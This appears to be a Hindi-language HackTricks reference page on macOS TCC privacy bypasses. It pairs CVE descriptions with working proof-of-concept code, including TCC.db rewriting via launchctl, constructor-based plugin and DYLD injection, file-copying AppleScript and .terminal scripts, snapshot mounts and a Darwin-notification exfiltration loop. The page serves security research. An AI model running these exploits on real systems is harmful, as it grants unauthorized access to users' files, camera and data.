# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

TCC grant storage और Automation sender/target attribution के लिए, [macOS TCC overview](../index.html#identify-apple-events-sender-and-target-grants) देखें।

## कार्यक्षमता के अनुसार

### Write Bypass

यह bypass नहीं है, यह बस TCC के काम करने का तरीका है: **यह लिखने से सुरक्षा नहीं देता**। अगर Terminal को किसी user के Desktop को read करने की **access नहीं है, तब भी वह उसमें लिख सकता है**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**extended attribute `com.apple.macl`** को नई **file** में जोड़ा जाता है, ताकि **file बनाने वाले app** को उसे पढ़ने की अनुमति मिले।<sup>[[2]](#references)</sup>

### TCC ClickJacking

**TCC prompt के ऊपर एक window रखना** संभव है, ताकि user को पता चले बिना वह इसे **accept** कर ले। PoC [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में मिल सकता है।<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### मनमाने नाम से TCC Request

Attacker **`Info.plist`** में किसी भी नाम (जैसे Finder, Google Chrome...) वाले **apps बना सकता है** और उनसे किसी TCC-protected location तक access का request करवा सकता है। User को लगेगा कि यह access असली application माँग रही है।\
इसके अलावा, **असली app को Dock से हटाकर उसकी जगह fake app रखना** संभव है। जब user fake app पर click करता है (जो वही icon इस्तेमाल कर सकता है), तो वह असली app को call कर सकता है, TCC permissions माँग सकता है और malware चला सकता है। इससे user को लगेगा कि access असली app ने माँगा है।<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहाँ मिलेंगे:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

डिफ़ॉल्ट रूप से, **SSH के ज़रिए access को "Full Disk Access" मिला करता था**। इसे disable करने के लिए, इसे सूची में रखकर disabled करना ज़रूरी है (सूची से हटाने पर वे privileges नहीं हटेंगे):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: डिफ़ॉल्ट रूप से, SSH के ज़रिए access को "Full Disk Access" मिला करता था। इसे disable करने के लिए, इसे सूची में रखकर disabled करना ज़रूरी है (इसे...](<../../../../../images/image (1077).png>)

यहाँ कुछ उदाहरण हैं कि कैसे **malwares इस protection को bypass करने में सफल रहे हैं**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि अब SSH enable करने के लिए **Full Disk Access** ज़रूरी है।

### Extensions को handle करना - CVE-2022-26767

Files को **`com.apple.macl`** attribute दिया जाता है, ताकि **किसी खास application को उन्हें पढ़ने की permissions मिलें।** यह attribute तब set होता है, जब किसी file को **drag\&drop** करके app पर डाला जाता है, या जब user किसी file को **default application** में खोलने के लिए उस पर **double-click** करता है।

इसलिए, user सभी extensions को handle करने के लिए **एक malicious app register कर सकता है** और किसी भी file को **open** करने के लिए Launch Services को call कर सकता है (जिससे malicious file को उसे पढ़ने की access मिल जाएगी)।<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement के ज़रिए **`com.apple.iCloudHelper`** XPC service से communicate किया जा सकता है, जो **iCloud tokens देता है**।

**iMovie** और **Garageband** के पास यह entitlement और अन्य अनुमतियाँ थीं।

इस entitlement से **iCloud tokens पाने** वाले exploit की अधिक **जानकारी** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Darwin notification names के ज़रिए Spotlight importer से data leakage

Spotlight importer, Spotlight द्वारा अपने `GetMetadataForFile` callback को दी गई file को पढ़ सकता है, भले ही Full Disk Access के बिना कोई सामान्य process उसे न पढ़ सके। [TCC-authorized process में code injection](../macos-tcc-credential-and-data-theft.md) के विपरीत, इसके लिए ऐसी local foothold चाहिए जो importer install कर सके और Spotlight indexing event से मेल खाए। Importer sandbox में चलता है, लेकिन केवल नाम वाले Darwin notifications उस sandbox के बाहर किसी listener तक bytes पहुँचा सकते हैं। यह data-leak channel है, importer से root या मनमानी files तक access पाने का रास्ता नहीं।<sup>[[24]](#references)</sup>

Importer के `Info.plist` में `CFBundleDocumentTypes` → `LSItemContentTypes` के तहत target file type declare करें, फिर bundle को `~/Library/Spotlight/` या किसी app के `Contents/Library/Spotlight/` में install करें। `mdimport -L` से registration जाँचें। [Spotlight importer section](../../../../macos-auto-start-locations.md#spotlight-plugins) में bundle placement और file-type matching की जानकारी है। Importer को केवल वे files मिलती हैं जिन्हें Spotlight उसके लिए चुनता है; आम तौर पर पहले से मौजूद importer को प्राथमिकता मिलती है। macOS 26 Tahoe पर, रिपोर्ट किए गए tests में `mdimport -i` से तुरंत recursive indexing भरोसेमंद ढंग से force नहीं हुई, जबकि `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ने उस importer द्वारा claim किए गए UTIs को दोबारा import करने का request किया।<sup>[[24]](#references)</sup>

Channel test के लिए, sandbox के बाहर listener को `notifyutil -w TEST_TEST_TEST` के साथ शुरू करें, फिर `CFNotificationCenterGetDarwinNotifyCenter()` और `NULL` object तथा `userInfo` के साथ notification post करें। `userInfo` payload वाले distributed notification के विपरीत, Darwin notification में केवल उसका name होता है। Binary data के लिए, `notify_register_dispatch` का उपयोग करके external listener को decimal names `0` से `255` तक register करें; हर callback की registration को उसके byte value से map करें। `GetMetadataForFile` के भीतर, केवल Spotlight द्वारा दी गई `pathToFile` को पढ़ें और हर byte को decimal notification name के रूप में भेजें:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener, TCC-protected file को खुद पढ़ने के बजाय byte sequence को फिर से बनाता है। प्रकाशित PoC ने macOS 26 पर SIP enabled वाले non-FDA terminal से `knowledgeC.db` के पहले 64 bytes recover किए। यह low-bandwidth है और bulk-copy का भरोसेमंद तरीका नहीं है: Spotlight किसी target file को index या reindex नहीं कर सकता, और concurrent importer instances notification streams को interleave कर सकते हैं। अन्य sandbox-boundary mechanisms के लिए [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) देखें।<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission वाला app **दूसरे Apps को control** कर पाएगा। इसका मतलब है कि वह **दूसरे Apps को दी गई permissions का दुरुपयोग** कर सकता है।<sup>[[2]](#references)</sup>

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, अगर किसी App के पास **`iTerm` पर Automation permission** है, तो वह इस उदाहरण में **`Terminal`** की तरह iTerm को access कर सकता है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm पर

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास FDA है, और उससे actions करवा सकता है:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder के माध्यम से

या अगर किसी App के पास Finder के ज़रिए access है, तो वह इस तरह की script चला सकता है:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## App के व्यवहार के अनुसार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

यूज़रस्पेस **tccd daemon** TCC यूज़र डेटाबेस को इस पथ से एक्सेस करने के लिए **`HOME`** **env** variable का उपयोग कर रहा था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange पोस्ट](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon मौजूदा यूज़र के डोमेन के भीतर `launchd` के ज़रिए चल रहा है, इसलिए इसे पास किए जाने वाले **सभी environment variables को नियंत्रित करना** संभव है।<sup>[[19]](#references)</sup>\
इसलिए, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **नियंत्रित** **directory** पर सेट कर सकता है, **TCC** daemon को **restart** कर सकता है, और फिर अंतिम यूज़र से कभी पूछे बिना, खुद को **उपलब्ध हर TCC entitlement देने के लिए TCC database को सीधे संशोधित** कर सकता है।<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes को TCC-सुरक्षित स्थानों तक पहुँच थी, लेकिन नया बनाया गया note **गैर-सुरक्षित स्थान पर संग्रहीत होता था**। इसलिए, attacker Notes से किसी सुरक्षित file को note में copy करने के लिए कह सकता था और फिर गैर-सुरक्षित स्थान से उस resulting data को access कर सकता था:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` library वाले binary `/usr/libexec/lsd` के पास `com.apple.private.nullfs_allow` entitlement था, जो उसे **nullfs** mount बनाने देता था। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ `com.apple.private.tcc.allow` entitlement भी था, जिससे वह हर file को access कर सकता था।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को call करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर के सभी documents को **access** किया जा सकता था।

### CVE-2024-44131 - FileProvider symlink race

जो apps file operations को **privileged helper** (यहाँ **`fileproviderd`** / `Files.app`) को सौंपते हैं, वे items को **user की ओर से** copy या move करते हैं। इसलिए copy, caller के बजाय helper के privileges के साथ चलती है।

Jamf Threat Labs ने दिखाया कि operation से पहले की जाने वाली symlink validation को **race** किया जा सकता है: symlink को path के **अंतिम** component पर रखने (जिसे check किया जाता है) के बजाय, attacker operation शुरू हो जाने के **बाद** path की एक **बीच वाली** directory को बदल देता है। फिर privileged helper attacker के नियंत्रण वाले link को follow करता है और **बिना prompt दिखाए** TCC-सुरक्षित स्थानों को read/write करता है।<sup>[[5]](#references)</sup>

ऐसी directories जो अपने path में random UUID से सुरक्षित **नहीं** हैं (उदाहरण के लिए `~/Library/Mobile Documents/com~apple~CloudDocs`), सबसे आसान targets हैं, क्योंकि attacker race करने के लिए पूरा path पहले से जान सकता है।

> [!TIP]
> यह वह सामान्य pattern है जिसे देखना चाहिए: **कोई भी privileged process जो किसी path को एक से अधिक बार resolve करता है** (check-then-use, या `rename()`/`copyfile()` द्वारा source और destination को अलग-अलग resolve करना), path के बीच में किसी directory को बदलकर race किया जा सकता है। केवल `O_NOFOLLOW_ANY`, पहले से खोले गए directory FD पर `openat()`, या `realpath()` + re-validation ही इस अवसर को वास्तव में बंद करते हैं।

अधिक जानकारी [**Jamf Threat Labs की writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) में है।<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` को `SQLITE_ENABLE_SQLLOG` के साथ build किया जा सकता है, जो environment variables से नियंत्रित logging hook जोड़ता है ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **खोले जाने वाले हर database** के लिए, database file की एक **copy** और SQL statements का log `path` में लिखा जाता है (directory पहले से मौजूद होनी चाहिए)।
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB को खोलने/attach करने पर हर बार पुरानी copy को reuse करने के बजाय **नई copy लें**।
- **`SQLITE_SQLLOG_CONDITIONAL`** – connection को तभी log करें, जब main DB के पास `<database>-sqllog` file मौजूद हो।

अगर आप इस variable को ऐसे process में inject कर सकते हैं जिसके पास **FDA** है और जो SQLite databases खोलता है, तो वह खुशी-खुशी उन **सुरक्षित databases को आपकी नियंत्रित directory में copy** कर देगा। क्योंकि destination filename attacker-नियंत्रित data से बनता है, इसलिए destination पर बनाई गई **symlink** इसी primitive को target process के privileges के साथ **arbitrary file write** में बदल देती है।

### **SQLITE_AUTO_TRACE**

अगर environment variable **`SQLITE_AUTO_TRACE`** set है, तो **`libsqlite3.dylib`** library सभी SQL queries को **log** करना शुरू कर देगी। कई applications इस library का उपयोग करती थीं, इसलिए उनकी सभी SQLite queries को log करना संभव था।<sup>[[22]](#references)</sup>

कई Apple applications TCC-सुरक्षित जानकारी access करने के लिए इस library का उपयोग करती थीं।

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### env-var से संचालित file writes की तलाश

पिछली दो entries एक ही generic technique के उदाहरण हैं, इसलिए इसके और उदाहरण तलाशना उपयोगी है: **TCC-privileged apps में load किए गए frameworks अक्सर debug/logging environment variables देते हैं, जिनसे process caller द्वारा नियंत्रित path पर file बना सकता है**।

इन्हें खोजने का तरीका:

1. FDA या कोई अन्य महत्वपूर्ण TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) वाले target को चुनें और उससे link होने वाले frameworks की सूची बनाएँ (`otool -L`, `vmmap`)।
2. उन frameworks में `getenv` strings खोजें: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`।
3. `launchctl setenv NAME /path/you/control` से candidate variables सेट करें, app launch करें और `fs_usage -w -f filesys <pid>` या `sudo fs_usage | grep <path>` से filesystem पर उसकी गतिविधि देखें।
4. अगर process आपकी directory में कोई file **बनाता या rename करता है**, तो आपके पास write primitive है: destination को symlink पर point करें (या बीच की directory में race condition का फायदा उठाएँ, जैसा ऊपर CVE-2024-44131 में है), ताकि write को `~/Library/Application Support/com.apple.TCC/TCC.db` पर redirect किया जा सके।

> [!TIP]
> इसकी दो सीमाएँ हैं। पहली, **hardened-runtime binaries के लिए `DYLD_*` variables को अनदेखा किया जाता है**, जब तक कि app में [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement शामिल न हो ("एक Boolean value जो बताती है कि dynamic linker environment variables से app प्रभावित हो सकता है या नहीं; इनका उपयोग app के process में code inject करने के लिए किया जा सकता है") — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) भी देखें। दूसरी, Apple framework की debug variables की report मिलने पर उन्हें एक-एक करके हटा देता है, इसलिए macOS के किसी एक release पर काम करने वाला variable अक्सर अगले release में हट चुका होता है। अगर variable सेट करने के बाद app बिना कोई संदेश दिए launch होने से मना कर दे, तो उस variable को पहले से filtered मानें।<sup>[[7]](#references)[[8]](#references)</sup>

Linker variables से इसी तरह की तरकीब के लिए [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) देखें।

### Apple Remote Desktop

Root के रूप में आप इस service को enable कर सकते थे और **ARD agent को full disk access मिलता**, जिसका उपयोग कोई user उससे नया **TCC user database** copy करवाने के लिए कर सकता था।

## **NFSHomeDirectory** के ज़रिए

TCC, user-विशिष्ट resources तक पहुँच को नियंत्रित करने के लिए user के HOME folder में database का उपयोग करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, अगर user TCC को ऐसे $HOME env variable के साथ restart करवा सके जो **किसी दूसरे folder** की ओर point करता हो, तो user **/Library/Application Support/com.apple.TCC/TCC.db** में नया TCC database बना सकता है और TCC को किसी भी app को कोई भी TCC permission देने के लिए धोखा दे सकता है।

> [!TIP]
> ध्यान दें कि Apple **`$HOME` का value** user के profile में मौजूद **`NFSHomeDirectory`** attribute की setting से लेता है। इसलिए, अगर आप किसी ऐसे application को compromise करते हैं जिसे इस value को modify करने की permission है (**`kTCCServiceSystemPolicySysAdminFiles`**), तो आप TCC bypass के लिए इस विकल्प को **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहले POC** में user के **HOME** folder को modify करने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग किया गया है।

1. Target app के लिए _csreq_ blob प्राप्त करें।
2. ज़रूरी access और _csreq_ blob वाली fake _TCC.db_ file रखें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) से user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry modify करें।
5. Modified Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) से import करें।
6. User का _tccd_ रोकें और process reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` entitlement था और उसका value `kTCCServiceSystemPolicySysAdminFiles` था।\
**`-t`** option के साथ **`configd`** चलाना संभव था, जिससे attacker **load करने के लिए custom Bundle निर्दिष्ट कर सकता था**। इसलिए, exploit में user की home directory बदलने के लिए **`dsexport`** और **`dsimport`** के तरीके को **`configd` code injection** से **बदल दिया गया**।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।<sup>[[11]](#references)</sup>

## process injection के ज़रिए

किसी process में code inject करने और उसके TCC privileges का दुरुपयोग करने की अलग-अलग techniques हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass करने के लिए मिलने वाला सबसे आम process injection **plugins (load library)** के ज़रिए होता है।\
Plugins अतिरिक्त code होते हैं, जो आमतौर पर libraries या plist के रूप में होते हैं। इन्हें **main application load करता है** और ये उसी के context में execute होते हैं। इसलिए, अगर main application को TCC-restricted files तक access था (granted permissions या entitlements के ज़रिए), तो **custom code को भी वह access मिलेगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करता था और इसमें **hardened** runtime नहीं था।

इस CVE को weaponize करने के लिए **`NFSHomeDirectory`** को (पिछले entitlement का दुरुपयोग करके) **बदला जाता है**, ताकि user का TCC database **कब्ज़े में लेकर** TCC bypass किया जा सके।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था** और दूसरा उसे **TCC manage करने का access देता था**।

यह binary `/Library/Audio/Plug-Ins/HAL` folder से **third-party plug-ins** load कर सकता था। इसलिए, इस PoC से **plugin load करके TCC permissions का दुरुपयोग करना** संभव था:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

वे System applications जो Core Media I/O के ज़रिए camera stream खोलते हैं (ऐसे apps जिनमें **`kTCCServiceCamera`** होता है), `/Library/CoreMediaIO/Plug-Ins/DAL` में मौजूद इन plugins को **अपने process में load करते हैं** (यह SIP restricted नहीं है)।

वहाँ केवल common **constructor** वाली library रखने से **code inject** हो जाएगा।

Apple के कई applications इस vulnerability से प्रभावित थे।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

इसका आसानी से शोषण कैसे करें, इसकी अधिक जानकारी के लिए [**मूल रिपोर्ट देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` के पास **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** entitlements थे, जिनकी मदद से process के अंदर code inject करना और TCC privileges का उपयोग करना संभव था।

### CVE-2023-26818 - Telegram

Telegram के पास **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** entitlements थे, इसलिए उनका दुरुपयोग करके इसके permissions तक पहुंचना संभव था, जैसे camera से recording करना। आप [**writeup में payload देख सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

ध्यान दें कि library load करने के लिए env variable का उपयोग करने हेतु, इस library को inject करने के लिए एक **custom plist** बनाई गई थी और उसे launch करने के लिए **`launchctl`** का उपयोग किया गया था:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## open invocations के ज़रिए

Sandboxed होने पर भी **`open`** को invoke करना संभव है।

### Terminal Scripts

Terminal को **Full Disk Access (FDA)** देना काफी आम है, कम-से-कम उन कंप्यूटरों पर जिनका इस्तेमाल तकनीकी लोग करते हैं। इसके साथ **`.terminal`** scripts को invoke करना भी संभव है।

**`.terminal`** scripts plist files होती हैं, जैसे यह फ़ाइल, जिसमें execute करने के लिए command **`CommandString`** key में होती है:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

कोई एप्लिकेशन /tmp जैसी जगह पर टर्मिनल स्क्रिप्ट लिख सकता है और उसे किसी ऐसे कमांड से लॉन्च कर सकता है:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## माउंट करके

### CVE-2020-9771 - mount_apfs TCC बायपास और प्रिविलेज एस्केलेशन

**कोई भी यूज़र** (यहाँ तक कि बिना प्रिविलेज वाले यूज़र भी) Time Machine snapshot बना और माउंट कर सकता है, और उस snapshot की **सभी फ़ाइलों तक पहुँच** प्राप्त कर सकता है।\
इसके लिए आवश्यक **एकमात्र प्रिविलेज** यह है कि इस्तेमाल किए गए एप्लिकेशन (जैसे `Terminal`) को **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) दिया गया हो, जिसे किसी एडमिन द्वारा प्रदान करना आवश्यक है।<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

एक अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में पाई जा सकती है**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

भले ही TCC DB फ़ाइल सुरक्षित हो, फिर भी **डायरेक्टरी पर mount over करके** एक नई TCC.db फ़ाइल लगाना संभव था:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में **full exploit** देखें।<sup>[[21]](#references)</sup>

### CVE-2024-40855

जैसा कि [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में बताया गया है, इस CVE ने `diskarbitrationd` का दुरुपयोग किया।<sup>[[16]](#references)</sup>

